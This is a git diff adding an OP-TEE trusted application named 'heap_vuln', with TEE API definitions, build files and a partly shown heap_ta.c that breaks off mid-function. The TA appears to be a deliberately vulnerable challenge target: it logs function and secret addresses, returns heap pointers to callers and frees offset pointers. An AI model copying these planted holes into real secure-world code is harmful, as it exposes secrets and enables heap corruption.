++#define TEE_DATA_FLAG_SHARE_WRITE          0x00000020
++#define TEE_DATA_FLAG_OVERWRITE            0x00000400
++#define TEE_DATA_MAX_POSITION              0xFFFFFFFF
++#define TEE_OBJECT_ID_MAX_LEN              64
++#define TEE_USAGE_EXTRACTABLE              0x00000001
++#define TEE_USAGE_ENCRYPT                  0x00000002
++#define TEE_USAGE_DECRYPT                  0x00000004
++#define TEE_USAGE_MAC                      0x00000008
++#define TEE_USAGE_SIGN                     0x00000010
++#define TEE_USAGE_VERIFY                   0x00000020
++#define TEE_USAGE_DERIVE                   0x00000040
++#define TEE_HANDLE_FLAG_PERSISTENT         0x00010000
++#define TEE_HANDLE_FLAG_INITIALIZED        0x00020000
++#define TEE_HANDLE_FLAG_KEY_SET            0x00040000
++#define TEE_HANDLE_FLAG_EXPECT_TWO_KEYS    0x00080000
++#define TEE_OPERATION_CIPHER               1
++#define TEE_OPERATION_MAC                  3
++#define TEE_OPERATION_AE                   4
++#define TEE_OPERATION_DIGEST               5
++#define TEE_OPERATION_ASYMMETRIC_CIPHER    6
++#define TEE_OPERATION_ASYMMETRIC_SIGNATURE 7
++#define TEE_OPERATION_KEY_DERIVATION       8
++#define TEE_OPERATION_EXTENSION		   0xF
++#define TEE_OPERATION_STATE_INITIAL        0x00000000
++#define TEE_OPERATION_STATE_ACTIVE         0x00000001
++
++/* Algorithm Identifiers */
++#define TEE_ALG_AES_ECB_NOPAD                   0x10000010
++#define TEE_ALG_AES_CBC_NOPAD                   0x10000110
++#define TEE_ALG_AES_CTR                         0x10000210
++#define TEE_ALG_AES_CTS                         0x10000310
++#define TEE_ALG_AES_XTS                         0x10000410
++#define TEE_ALG_AES_CBC_MAC_NOPAD               0x30000110
++#define TEE_ALG_AES_CBC_MAC_PKCS5               0x30000510
++#define TEE_ALG_AES_CMAC                        0x30000610
++#define TEE_ALG_AES_CCM                         0x40000710
++#define TEE_ALG_AES_GCM                         0x40000810
++#define TEE_ALG_DES_ECB_NOPAD                   0x10000011
++#define TEE_ALG_DES_CBC_NOPAD                   0x10000111
++#define TEE_ALG_DES_CBC_MAC_NOPAD               0x30000111
++#define TEE_ALG_DES_CBC_MAC_PKCS5               0x30000511
++#define TEE_ALG_DES3_ECB_NOPAD                  0x10000013
++#define TEE_ALG_DES3_CBC_NOPAD                  0x10000113
++#define TEE_ALG_DES3_CBC_MAC_NOPAD              0x30000113
++#define TEE_ALG_DES3_CBC_MAC_PKCS5              0x30000513
++#define TEE_ALG_RSASSA_PKCS1_V1_5_MD5           0x70001830
++#define TEE_ALG_RSASSA_PKCS1_V1_5_SHA1          0x70002830
++#define TEE_ALG_RSASSA_PKCS1_V1_5_SHA224        0x70003830
++#define TEE_ALG_RSASSA_PKCS1_V1_5_SHA256        0x70004830
++#define TEE_ALG_RSASSA_PKCS1_V1_5_SHA384        0x70005830
++#define TEE_ALG_RSASSA_PKCS1_V1_5_SHA512        0x70006830
++#define TEE_ALG_RSASSA_PKCS1_V1_5_MD5SHA1       0x7000F830
++#define TEE_ALG_RSASSA_PKCS1_PSS_MGF1_SHA1      0x70212930
++#define TEE_ALG_RSASSA_PKCS1_PSS_MGF1_SHA224    0x70313930
++#define TEE_ALG_RSASSA_PKCS1_PSS_MGF1_SHA256    0x70414930
++#define TEE_ALG_RSASSA_PKCS1_PSS_MGF1_SHA384    0x70515930
++#define TEE_ALG_RSASSA_PKCS1_PSS_MGF1_SHA512    0x70616930
++#define TEE_ALG_RSAES_PKCS1_V1_5                0x60000130
++#define TEE_ALG_RSAES_PKCS1_OAEP_MGF1_SHA1      0x60210230
++#define TEE_ALG_RSAES_PKCS1_OAEP_MGF1_SHA224    0x60310230
++#define TEE_ALG_RSAES_PKCS1_OAEP_MGF1_SHA256    0x60410230
++#define TEE_ALG_RSAES_PKCS1_OAEP_MGF1_SHA384    0x60510230
++#define TEE_ALG_RSAES_PKCS1_OAEP_MGF1_SHA512    0x60610230
++#define TEE_ALG_RSA_NOPAD                       0x60000030
++#define TEE_ALG_DSA_SHA1                        0x70002131
++#define TEE_ALG_DSA_SHA224                      0x70003131
++#define TEE_ALG_DSA_SHA256                      0x70004131
++#define TEE_ALG_DH_DERIVE_SHARED_SECRET         0x80000032
++#define TEE_ALG_MD5                             0x50000001
++#define TEE_ALG_SHA1                            0x50000002
++#define TEE_ALG_SHA224                          0x50000003
++#define TEE_ALG_SHA256                          0x50000004
++#define TEE_ALG_SHA384                          0x50000005
++#define TEE_ALG_SHA512                          0x50000006
++#define TEE_ALG_MD5SHA1                         0x5000000F
++#define TEE_ALG_HMAC_MD5                        0x30000001
++#define TEE_ALG_HMAC_SHA1                       0x30000002
++#define TEE_ALG_HMAC_SHA224                     0x30000003
++#define TEE_ALG_HMAC_SHA256                     0x30000004
++#define TEE_ALG_HMAC_SHA384                     0x30000005
++#define TEE_ALG_HMAC_SHA512                     0x30000006
++/*
++ * Fix GP Internal Core API v1.1
++ *     "Table 6-12:  Structure of Algorithm Identifier"
++ *     indicates ECDSA have the algorithm "0x41" and ECDH "0x42"
++ * whereas
++ *     "Table 6-11:  List of Algorithm Identifiers" defines
++ *     TEE_ALG_ECDSA_P192 as 0x70001042
++ *
++ * We chose to define TEE_ALG_ECDSA_P192 as 0x70001041 (conform to table 6-12)
++ */
++#define TEE_ALG_ECDSA_P192                      0x70001041
++#define TEE_ALG_ECDSA_P224                      0x70002041
++#define TEE_ALG_ECDSA_P256                      0x70003041
++#define TEE_ALG_ECDSA_P384                      0x70004041
++#define TEE_ALG_ECDSA_P521                      0x70005041
++#define TEE_ALG_ECDH_P192                       0x80001042
++#define TEE_ALG_ECDH_P224                       0x80002042
++#define TEE_ALG_ECDH_P256                       0x80003042
++#define TEE_ALG_ECDH_P384                       0x80004042
++#define TEE_ALG_ECDH_P521                       0x80005042
++
++/* Object Types */
++
++#define TEE_TYPE_AES                        0xA0000010
++#define TEE_TYPE_DES                        0xA0000011
++#define TEE_TYPE_DES3                       0xA0000013
++#define TEE_TYPE_HMAC_MD5                   0xA0000001
++#define TEE_TYPE_HMAC_SHA1                  0xA0000002
++#define TEE_TYPE_HMAC_SHA224                0xA0000003
++#define TEE_TYPE_HMAC_SHA256                0xA0000004
++#define TEE_TYPE_HMAC_SHA384                0xA0000005
++#define TEE_TYPE_HMAC_SHA512                0xA0000006
++#define TEE_TYPE_RSA_PUBLIC_KEY             0xA0000030
++#define TEE_TYPE_RSA_KEYPAIR                0xA1000030
++#define TEE_TYPE_DSA_PUBLIC_KEY             0xA0000031
++#define TEE_TYPE_DSA_KEYPAIR                0xA1000031
++#define TEE_TYPE_DH_KEYPAIR                 0xA1000032
++#define TEE_TYPE_ECDSA_PUBLIC_KEY           0xA0000041
++#define TEE_TYPE_ECDSA_KEYPAIR              0xA1000041
++#define TEE_TYPE_ECDH_PUBLIC_KEY            0xA0000042
++#define TEE_TYPE_ECDH_KEYPAIR               0xA1000042
++#define TEE_TYPE_GENERIC_SECRET             0xA0000000
++#define TEE_TYPE_CORRUPTED_OBJECT           0xA00000BE
++#define TEE_TYPE_DATA                       0xA00000BF
++
++/* List of Object or Operation Attributes */
++
++#define TEE_ATTR_SECRET_VALUE               0xC0000000
++#define TEE_ATTR_RSA_MODULUS                0xD0000130
++#define TEE_ATTR_RSA_PUBLIC_EXPONENT        0xD0000230
++#define TEE_ATTR_RSA_PRIVATE_EXPONENT       0xC0000330
++#define TEE_ATTR_RSA_PRIME1                 0xC0000430
++#define TEE_ATTR_RSA_PRIME2                 0xC0000530
++#define TEE_ATTR_RSA_EXPONENT1              0xC0000630
++#define TEE_ATTR_RSA_EXPONENT2              0xC0000730
++#define TEE_ATTR_RSA_COEFFICIENT            0xC0000830
++#define TEE_ATTR_DSA_PRIME                  0xD0001031
++#define TEE_ATTR_DSA_SUBPRIME               0xD0001131
++#define TEE_ATTR_DSA_BASE                   0xD0001231
++#define TEE_ATTR_DSA_PUBLIC_VALUE           0xD0000131
++#define TEE_ATTR_DSA_PRIVATE_VALUE          0xC0000231
++#define TEE_ATTR_DH_PRIME                   0xD0001032
++#define TEE_ATTR_DH_SUBPRIME                0xD0001132
++#define TEE_ATTR_DH_BASE                    0xD0001232
++#define TEE_ATTR_DH_X_BITS                  0xF0001332
++#define TEE_ATTR_DH_PUBLIC_VALUE            0xD0000132
++#define TEE_ATTR_DH_PRIVATE_VALUE           0xC0000232
++#define TEE_ATTR_RSA_OAEP_LABEL             0xD0000930
++#define TEE_ATTR_RSA_PSS_SALT_LENGTH        0xF0000A30
++#define TEE_ATTR_ECC_PUBLIC_VALUE_X         0xD0000141
++#define TEE_ATTR_ECC_PUBLIC_VALUE_Y         0xD0000241
++#define TEE_ATTR_ECC_PRIVATE_VALUE          0xC0000341
++#define TEE_ATTR_ECC_CURVE                  0xF0000441
++
++#define TEE_ATTR_BIT_PROTECTED		(1 << 28)
++#define TEE_ATTR_BIT_VALUE		(1 << 29)
++
++/* List of Supported ECC Curves */
++#define TEE_ECC_CURVE_NIST_P192             0x00000001
++#define TEE_ECC_CURVE_NIST_P224             0x00000002
++#define TEE_ECC_CURVE_NIST_P256             0x00000003
++#define TEE_ECC_CURVE_NIST_P384             0x00000004
++#define TEE_ECC_CURVE_NIST_P521             0x00000005
++
++
++/* Panicked Functions Identification */
++/* TA Interface */
++#define TEE_PANIC_ID_TA_CLOSESESSIONENTRYPOINT      0x00000101
++#define TEE_PANIC_ID_TA_CREATEENTRYPOINT            0x00000102
++#define TEE_PANIC_ID_TA_DESTROYENTRYPOINT           0x00000103
++#define TEE_PANIC_ID_TA_INVOKECOMMANDENTRYPOINT     0x00000104
++#define TEE_PANIC_ID_TA_OPENSESSIONENTRYPOINT       0x00000105
++/* Property Access */
++#define TEE_PANIC_ID_TEE_ALLOCATEPROPERTYENUMERATOR 0x00000201
++#define TEE_PANIC_ID_TEE_FREEPROPERTYENUMERATOR     0x00000202
++#define TEE_PANIC_ID_TEE_GETNEXTPROPERTY            0x00000203
++#define TEE_PANIC_ID_TEE_GETPROPERTYASBINARYBLOCK   0x00000204
++#define TEE_PANIC_ID_TEE_GETPROPERTYASBOOL          0x00000205
++#define TEE_PANIC_ID_TEE_GETPROPERTYASIDENTITY      0x00000206
++#define TEE_PANIC_ID_TEE_GETPROPERTYASSTRING        0x00000207
++#define TEE_PANIC_ID_TEE_GETPROPERTYASU32           0x00000208
++#define TEE_PANIC_ID_TEE_GETPROPERTYASUUID          0x00000209
++#define TEE_PANIC_ID_TEE_GETPROPERTYNAME            0x0000020A
++#define TEE_PANIC_ID_TEE_RESETPROPERTYENUMERATOR    0x0000020B
++#define TEE_PANIC_ID_TEE_STARTPROPERTYENUMERATOR    0x0000020C
++/* Panic Function */
++#define TEE_PANIC_ID_TEE_PANIC                      0x00000301
++/* Internal Client API */
++#define TEE_PANIC_ID_TEE_CLOSETASESSION             0x00000401
++#define TEE_PANIC_ID_TEE_INVOKETACOMMAND            0x00000402
++#define TEE_PANIC_ID_TEE_OPENTASESSION              0x00000403
++/* Cancellation */
++#define TEE_PANIC_ID_TEE_GETCANCELLATIONFLAG        0x00000501
++#define TEE_PANIC_ID_TEE_MASKCANCELLATION           0x00000502
++#define TEE_PANIC_ID_TEE_UNMASKCANCELLATION         0x00000503
++/* Memory Management */
++#define TEE_PANIC_ID_TEE_CHECKMEMORYACCESSRIGHTS    0x00000601
++#define TEE_PANIC_ID_TEE_FREE                       0x00000602
++#define TEE_PANIC_ID_TEE_GETINSTANCEDATA            0x00000603
++#define TEE_PANIC_ID_TEE_MALLOC                     0x00000604
++#define TEE_PANIC_ID_TEE_MEMCOMPARE                 0x00000605
++#define TEE_PANIC_ID_TEE_MEMFILL                    0x00000606
++#define TEE_PANIC_ID_TEE_MEMMOVE                    0x00000607
++#define TEE_PANIC_ID_TEE_REALLOC                    0x00000608
++#define TEE_PANIC_ID_TEE_SETINSTANCEDATA            0x00000609
++/* Generic Object */
++#define TEE_PANIC_ID_TEE_CLOSEOBJECT                0x00000701
++#define TEE_PANIC_ID_TEE_GETOBJECTBUFFERATTRIBUTE   0x00000702
++/* deprecated */
++#define TEE_PANIC_ID_TEE_GETOBJECTINFO              0x00000703
++#define TEE_PANIC_ID_TEE_GETOBJECTVALUEATTRIBUTE    0x00000704
++/* deprecated */
++#define TEE_PANIC_ID_TEE_RESTRICTOBJECTUSAGE        0x00000705
++#define TEE_PANIC_ID_TEE_GETOBJECTINFO1             0x00000706
++#define TEE_PANIC_ID_TEE_RESTRICTOBJECTUSAGE1       0x00000707
++/* Transient Object */
++#define TEE_PANIC_ID_TEE_ALLOCATETRANSIENTOBJECT    0x00000801
++/* deprecated */
++#define TEE_PANIC_ID_TEE_COPYOBJECTATTRIBUTES       0x00000802
++#define TEE_PANIC_ID_TEE_FREETRANSIENTOBJECT        0x00000803
++#define TEE_PANIC_ID_TEE_GENERATEKEY                0x00000804
++#define TEE_PANIC_ID_TEE_INITREFATTRIBUTE           0x00000805
++#define TEE_PANIC_ID_TEE_INITVALUEATTRIBUTE         0x00000806
++#define TEE_PANIC_ID_TEE_POPULATETRANSIENTOBJECT    0x00000807
++#define TEE_PANIC_ID_TEE_RESETTRANSIENTOBJECT       0x00000808
++#define TEE_PANIC_ID_TEE_COPYOBJECTATTRIBUTES1      0x00000809
++/* Persistent Object */
++/* deprecated */
++#define TEE_PANIC_ID_TEE_CLOSEANDDELETEPERSISTENTOBJECT  0x00000901
++#define TEE_PANIC_ID_TEE_CREATEPERSISTENTOBJECT          0x00000902
++#define TEE_PANIC_ID_TEE_OPENPERSISTENTOBJECT            0x00000903
++#define TEE_PANIC_ID_TEE_RENAMEPERSISTENTOBJECT          0x00000904
++#define TEE_PANIC_ID_TEE_CLOSEANDDELETEPERSISTENTOBJECT1 0x00000905
++/* Persistent Object Enumeration */
++#define TEE_PANIC_ID_TEE_ALLOCATEPERSISTENTOBJECTENUMERATOR 0x00000A01
++#define TEE_PANIC_ID_TEE_FREEPERSISTENTOBJECTENUMERATOR     0x00000A02
++#define TEE_PANIC_ID_TEE_GETNEXTPERSISTENTOBJECT            0x00000A03
++#define TEE_PANIC_ID_TEE_RESETPERSISTENTOBJECTENUMERATOR    0x00000A04
++#define TEE_PANIC_ID_TEE_STARTPERSISTENTOBJECTENUMERATOR    0x00000A05
++/* Data Stream Access */
++#define TEE_PANIC_ID_TEE_READOBJECTDATA             0x00000B01
++#define TEE_PANIC_ID_TEE_SEEKOBJECTDATA             0x00000B02
++#define TEE_PANIC_ID_TEE_TRUNCATEOBJECTDATA         0x00000B03
++#define TEE_PANIC_ID_TEE_WRITEOBJECTDATA            0x00000B04
++/* Generic Operation */
++#define TEE_PANIC_ID_TEE_ALLOCATEOPERATION          0x00000C01
++#define TEE_PANIC_ID_TEE_COPYOPERATION              0x00000C02
++#define TEE_PANIC_ID_TEE_FREEOPERATION              0x00000C03
++#define TEE_PANIC_ID_TEE_GETOPERATIONINFO           0x00000C04
++#define TEE_PANIC_ID_TEE_RESETOPERATION             0x00000C05
++#define TEE_PANIC_ID_TEE_SETOPERATIONKEY            0x00000C06
++#define TEE_PANIC_ID_TEE_SETOPERATIONKEY2           0x00000C07
++#define TEE_PANIC_ID_TEE_GETOPERATIONINFOMULTIPLE   0x00000C08
++/* Message Digest */
++#define TEE_PANIC_ID_TEE_DIGESTDOFINAL              0x00000D01
++#define TEE_PANIC_ID_TEE_DIGESTUPDATE               0x00000D02
++/* Symmetric Cipher */
++#define TEE_PANIC_ID_TEE_CIPHERDOFINAL              0x00000E01
++#define TEE_PANIC_ID_TEE_CIPHERINIT                 0x00000E02
++#define TEE_PANIC_ID_TEE_CIPHERUPDATE               0x00000E03
++/* MAC */
++#define TEE_PANIC_ID_TEE_MACCOMPAREFINAL            0x00000F01
++#define TEE_PANIC_ID_TEE_MACCOMPUTEFINAL            0x00000F02
++#define TEE_PANIC_ID_TEE_MACINIT                    0x00000F03
++#define TEE_PANIC_ID_TEE_MACUPDATE                  0x00000F04
++/* Authenticated Encryption */
++#define TEE_PANIC_ID_TEE_AEDECRYPTFINAL             0x00001001
++#define TEE_PANIC_ID_TEE_AEENCRYPTFINAL             0x00001002
++#define TEE_PANIC_ID_TEE_AEINIT                     0x00001003
++#define TEE_PANIC_ID_TEE_AEUPDATE                   0x00001004
++#define TEE_PANIC_ID_TEE_AEUPDATEAAD                0x00001005
++/* Asymmetric */
++#define TEE_PANIC_ID_TEE_ASYMMETRICDECRYPT          0x00001101
++#define TEE_PANIC_ID_TEE_ASYMMETRICENCRYPT          0x00001102
++#define TEE_PANIC_ID_TEE_ASYMMETRICSIGNDIGEST       0x00001103
++#define TEE_PANIC_ID_TEE_ASYMMETRICVERIFYDIGEST     0x00001104
++/* Key Derivation */
++#define TEE_PANIC_ID_TEE_DERIVEKEY                  0x00001201
++/* Random Data Generation */
++#define TEE_PANIC_ID_TEE_GENERATERANDOM             0x00001301
++/* Time */
++#define TEE_PANIC_ID_TEE_GETREETIME                 0x00001401
++#define TEE_PANIC_ID_TEE_GETSYSTEMTIME              0x00001402
++#define TEE_PANIC_ID_TEE_GETTAPERSISTENTTIME        0x00001403
++#define TEE_PANIC_ID_TEE_SETTAPERSISTENTTIME        0x00001404
++#define TEE_PANIC_ID_TEE_WAIT                       0x00001405
++/* Memory Allocation and Size of Objects */
++#define TEE_PANIC_ID_TEE_BIGINTFMMCONTEXTSIZEINU32  0x00001501
++#define TEE_PANIC_ID_TEE_BIGINTFMMSIZEINU32         0x00001502
++/* Initialization */
++#define TEE_PANIC_ID_TEE_BIGINTINIT                 0x00001601
++#define TEE_PANIC_ID_TEE_BIGINTINITFMM              0x00001602
++#define TEE_PANIC_ID_TEE_BIGINTINITFMMCONTEXT       0x00001603
++/* Converter */
++#define TEE_PANIC_ID_TEE_BIGINTCONVERTFROMOCTETSTRING 0x00001701
++#define TEE_PANIC_ID_TEE_BIGINTCONVERTFROMS32         0x00001702
++#define TEE_PANIC_ID_TEE_BIGINTCONVERTTOOCTETSTRING   0x00001703
++#define TEE_PANIC_ID_TEE_BIGINTCONVERTTOS32           0x00001704
++/* Logical Operation */
++#define TEE_PANIC_ID_TEE_BIGINTCMP                  0x00001801
++#define TEE_PANIC_ID_TEE_BIGINTCMPS32               0x00001802
++#define TEE_PANIC_ID_TEE_BIGINTGETBIT               0x00001803
++#define TEE_PANIC_ID_TEE_BIGINTGETBITCOUNT          0x00001804
++#define TEE_PANIC_ID_TEE_BIGINTSHIFTRIGHT           0x00001805
++/* Basic Arithmetic */
++#define TEE_PANIC_ID_TEE_BIGINTADD                  0x00001901
++#define TEE_PANIC_ID_TEE_BIGINTDIV                  0x00001902
++#define TEE_PANIC_ID_TEE_BIGINTMUL                  0x00001903
++#define TEE_PANIC_ID_TEE_BIGINTNEG                  0x00001904
++#define TEE_PANIC_ID_TEE_BIGINTSQUARE               0x00001905
++#define TEE_PANIC_ID_TEE_BIGINTSUB                  0x00001906
++/* Modular Arithmetic */
++#define TEE_PANIC_ID_TEE_BIGINTADDMOD               0x00001A01
++#define TEE_PANIC_ID_TEE_BIGINTINVMOD               0x00001A02
++#define TEE_PANIC_ID_TEE_BIGINTMOD                  0x00001A03
++#define TEE_PANIC_ID_TEE_BIGINTMULMOD               0x00001A04
++#define TEE_PANIC_ID_TEE_BIGINTSQUAREMOD            0x00001A05
++#define TEE_PANIC_ID_TEE_BIGINTSUBMOD               0x00001A06
++/* Other Arithmetic */
++#define TEE_PANIC_ID_TEE_BIGINTCOMPUTEEXTENDEDGCD   0x00001B01
++#define TEE_PANIC_ID_TEE_BIGINTISPROBABLEPRIME      0x00001B02
++#define TEE_PANIC_ID_TEE_BIGINTRELATIVEPRIME        0x00001B03
++/* Fast Modular Multiplication */
++#define TEE_PANIC_ID_TEE_BIGINTCOMPUTEFMM           0x00001C01
++#define TEE_PANIC_ID_TEE_BIGINTCONVERTFROMFMM       0x00001C02
++#define TEE_PANIC_ID_TEE_BIGINTCONVERTTOFMM         0x00001C03
++
++/*
++ * The macro TEE_PARAM_TYPES can be used to construct a value that you can
++ * compare against an incoming paramTypes to check the type of all the
++ * parameters in one comparison, like in the following example:
++ * if (paramTypes != TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT,
++ *                                  TEE_PARAM_TYPE_MEMREF_OUPUT,
++ *                                  TEE_PARAM_TYPE_NONE, TEE_PARAM_TYPE_NONE)) {
++ *      return TEE_ERROR_BAD_PARAMETERS;
++ *  }
++ */
++#define TEE_PARAM_TYPES(t0,t1,t2,t3) \
++   ((t0) | ((t1) << 4) | ((t2) << 8) | ((t3) << 12))
++
++/*
++ * The macro TEE_PARAM_TYPE_GET can be used to extract the type of a given
++ * parameter from paramTypes if you need more fine-grained type checking.
++ */
++#define TEE_PARAM_TYPE_GET(t, i) ((((uint32_t)t) >> ((i)*4)) & 0xF)
++
++/*
++ * The macro TEE_PARAM_TYPE_SET can be used to load the type of a given
++ * parameter from paramTypes without specifying all types (TEE_PARAM_TYPES)
++ */
++#define TEE_PARAM_TYPE_SET(t, i) (((uint32_t)(t) & 0xF) << ((i)*4))
++
++/* Not specified in the standard */
++#define TEE_NUM_PARAMS  4
++
++/* TEE Arithmetical APIs */
++
++#define TEE_BigIntSizeInU32(n) ((((n)+31)/32)+2)
++
++#endif /* TEE_API_DEFINES_H */
+diff --git a/heap_vuln/host/tee_api_defines.h.url b/heap_vuln/host/tee_api_defines.h.url
+new file mode 100644
+index 0000000..d9f32bb
+--- /dev/null
++++ b/heap_vuln/host/tee_api_defines.h.url
+@@ -0,0 +1 @@
++https://raw.githubusercontent.com/OP-TEE/optee_os/3.4.0/lib/libutee/include/tee_api_defines.h
+diff --git a/heap_vuln/ta/Android.mk b/heap_vuln/ta/Android.mk
+new file mode 100644
+index 0000000..a1ff14a
+--- /dev/null
++++ b/heap_vuln/ta/Android.mk
+@@ -0,0 +1,4 @@
++LOCAL_PATH := $(call my-dir)
++
++local_module := 8aaaf200-2450-11e4-abe2-0002a5d5c51b.ta
++include $(BUILD_OPTEE_MK)
+diff --git a/heap_vuln/ta/Makefile b/heap_vuln/ta/Makefile
+new file mode 100644
+index 0000000..ee514d7
+--- /dev/null
++++ b/heap_vuln/ta/Makefile
+@@ -0,0 +1,17 @@
++CFG_TEE_TA_LOG_LEVEL ?= 4
++CPPFLAGS += -DCFG_TEE_TA_LOG_LEVEL=$(CFG_TEE_TA_LOG_LEVEL)
++
++# The UUID for the Trusted Application
++BINARY=ca212bbe-02b2-422c-8720-ba8f5d50414c
++
++-include $(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk
++
++# cppflags$(sm)   += -I/root/op-tee/optee_os/core/include
++#cppflags$(sm)   += -I$(TA_DEV_KIT_DIR)/core/include
++#cppflags$(sm)   += -I$(ta-dev-kit-dir$(sm))/core/include
++
++ifeq ($(wildcard $(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk), )
++clean:
++	@echo 'Note: $$(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk not found, cannot clean TA'
++	@echo 'Note: TA_DEV_KIT_DIR=$(TA_DEV_KIT_DIR)'
++endif
+diff --git a/heap_vuln/ta/heap_ta.c b/heap_vuln/ta/heap_ta.c
+new file mode 100644
+index 0000000..66eeb60
+--- /dev/null
++++ b/heap_vuln/ta/heap_ta.c
+@@ -0,0 +1,412 @@
++#include <tee_api.h>
++#include <tee_internal_api.h>
++#include <tee_internal_api_extensions.h>
++
++// #include <utee_syscalls.h>
++#include <heap_ta.h>
++#include <string.h>
++#include <util.h>
++#include <stdlib.h>
++#include <utee_syscalls.h>
++
++// #include <kernel/mutex.h>
++
++// static struct mutex user_mutex = MUTEX_INITIALIZER;
++
++// void utee_return(unsigned long ret) __noreturn;
++
++// ================================================================
++// TRACING
++// ================================================================
++
++#define SIGN() (IMSG("%s has been called\n", __FUNCTION__))
++
++// ================================================================
++// DATA STRUCTURES AND BSS/DATA MEMORY
++// ================================================================
++
++#define MAX_USER_COUNT 4
++char const *const SECRET = "TOPSECRETTOPSECRETTOPSECRET";
++
++typedef struct User
++{
++    // There was a bug with the session management, thus we added a validity flag to avoid handling invalid entries:
++    bool is_valid;
++    // The user who wants to authenticate later.
++    char *username;
++    // is set to true after the user has logged in
++    bool is_logged_in;
++    size_t username_len;
++    // unicode passwords can contain null bytes, thus we have to save the length too. *cough* *cough*
++    size_t password_len;
++    // The password that the user has to pass later to succeed authentizing.
++    char *password_from_db;
++} User;
++
++User *users[MAX_USER_COUNT] = {};
++
++// ================================================================
++// OPEN & CLOSE ENTRY POINTS
++// ================================================================
++
++TEE_Result TA_CreateEntryPoint(void)
++{
++    SIGN();
++
++    DMSG("Hello, I'm HEAP!\n");
++    DMSG("memcpy is at %p", (void *)memcpy);
++    DMSG("sizeof(User) is 0x%zx", sizeof(User));
++    DMSG("TA_OpenSessionEntryPoint is at %p", (void *)TA_OpenSessionEntryPoint);
++    DMSG("TEE_InvokeTACommand is at %p", (void *)TEE_InvokeTACommand);
++    // DMSG("utee_log is at %p", (void*)utee_log);
++    // DMSG("utee_return is at %p", (void*)utee_return);
++    DMSG("users are at %p", (void *)users);
++    DMSG("SECRET is at %p", (void *)SECRET);
++    DMSG("TEE_ReadObjectData is at %p", (void *)TEE_ReadObjectData);
++
++    return TEE_SUCCESS;
++}
++
++void TA_DestroyEntryPoint(void)
++{
++    SIGN();
++
++    for (size_t i = 0; i < MAX_USER_COUNT; ++i) {
++        if (users[i] != NULL) {
++            DMSG("Freeing [User %i]", (int)i);
++            if (users[i]->is_valid && users[i]->username != NULL) {
++                free(users[i]->username);
++                users[i]->username = NULL;
++            }
++            // if (users[i]->password_from_db != NULL) {
++            //     free(users[i]->password_from_db);
++            //     users[i]->password_from_db = NULL;
++            // }
++            free(users[i]);
++            users[i] = NULL;
++        }
++    }
++}
++
++TEE_Result TA_OpenSessionEntryPoint(uint32_t param_types,
++                                    TEE_Param params[4],
++                                    void **sess_ctx)
++{
++    SIGN();
++
++    uint32_t exp_param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_NONE,
++                                               TEE_PARAM_TYPE_NONE,
++                                               TEE_PARAM_TYPE_NONE,
++                                               TEE_PARAM_TYPE_NONE);
++
++    if (param_types != exp_param_types)
++        return TEE_ERROR_BAD_PARAMETERS;
++
++    (void)&params;
++    (void)&sess_ctx;
++
++    return TEE_SUCCESS;
++}
++
++void TA_CloseSessionEntryPoint(void __maybe_unused *sess_ctx)
++{
++    (void)&sess_ctx; /* Unused parameter */
++    SIGN();
++}
++
++// ================================================================
++// HELPER FUNCTIONS
++// ================================================================
++
++void *memdup(const void *mem, size_t size);
++void *memdup(const void *mem, size_t size)
++{
++    void *out = malloc(size);
++
++    if (out != NULL)
++        memcpy(out, mem, size);
++
++    return out;
++}
++
++// ================================================================
++// STUBS
++// ================================================================
++
++static char *aquire_password_by_username(const char *username,
++                                         size_t username_len,
++                                         size_t *out_password_len)
++{
++    *out_password_len = 8;
++    // query highly volatile database containing too short passwords using unescaped query string:
++    return strdup("SQL:p4ssw0rd:FFFFFFFFFFFFFFFF") + 4;
++}
++
++static void release_password(char *password)
++{
++    free(password - 4);
++}
++
++// ================================================================
++// COMMANDS
++// ================================================================
++
++static TEE_Result call_user_enter(uint32_t param_types, TEE_Param params[4])
++{
++    uint32_t exp_param_types = TEE_PARAM_TYPES(
++        TEE_PARAM_TYPE_MEMREF_INPUT, // username
++        TEE_PARAM_TYPE_VALUE_OUTPUT, // user id
++        TEE_PARAM_TYPE_VALUE_OUTPUT, // user addr
++        TEE_PARAM_TYPE_NONE);
++
++    SIGN();
++
++    if (param_types != exp_param_types)
++        return TEE_ERROR_BAD_PARAMETERS;
++
++    // copy to avoid reading race conditions.
++    size_t username_len = params[0].memref.size;
++    char *username = memdup(params[0].memref.buffer, username_len);
++    if (!username)
++        return TEE_ERROR_OUT_OF_MEMORY;
++
++    // size_t size0 = reg_pair_to_64(params[1].value.a,params[1].value.b);
++    // size_t size2 = params[2].memref.size;
++
++    for (size_t i = 0; i < MAX_USER_COUNT; i++)
++    {
++        if (users[i] != NULL)
++        {
++            if (users[i]->username != NULL)
++            {
++                DMSG("[User %i] username: %s, is_valid: %d, is_logged_in: %d",
++                     (int)i, users[i]->username, users[i]->is_valid, users[i]->is_logged_in);
++            }
++            else
++            {
++                DMSG("[User %i] username: NULL, is_valid: %d, is_logged_in: %d",
++                     (int)i, users[i]->is_valid, users[i]->is_logged_in);
++            }
++        }
++        User *user = users[i];
++        // there is a memleak somewhere here, does anybody know how to valgrind a TA?
++        if (user == NULL)
++        {
++            user = calloc(1, sizeof(User));
++            user->is_valid = false;
++            users[i] = user;
++        }
++        if (!user->is_valid)
++        {
++            user->is_valid = true;
++            user->username = username;
++            user->username_len = username_len;
++            user->is_logged_in = false;
++            user->password_from_db = aquire_password_by_username(username, username_len, &user->password_len);
++            // return user id
++            reg_pair_from_64(i, &params[1].value.a, &params[1].value.b);
++            // return user addr
++            reg_pair_from_64((uint64_t)user, &params[2].value.a, &params[2].value.b);
++            DMSG("[User %i] created at [%p].", (int)i, (void *)user);
++            return TEE_SUCCESS;
++        }
++    }
++
++    // cleanup:
++    free(username);
++
++    DMSG("No free user.");
++    return TEE_ERROR_OUT_OF_MEMORY;
++}
++
++static TEE_Result call_user_exit(uint32_t param_types, TEE_Param params[4])
++{
++    uint32_t exp_param_types = TEE_PARAM_TYPES(
++        TEE_PARAM_TYPE_VALUE_INPUT, // user id
++        TEE_PARAM_TYPE_NONE,
++        TEE_PARAM_TYPE_NONE,
++        TEE_PARAM_TYPE_NONE);
++
++    SIGN();
++
++    if (param_types != exp_param_types)
++        return TEE_ERROR_BAD_PARAMETERS;
++
++    size_t user_id = reg_pair_to_64(params[0].value.a, params[0].value.b);
++
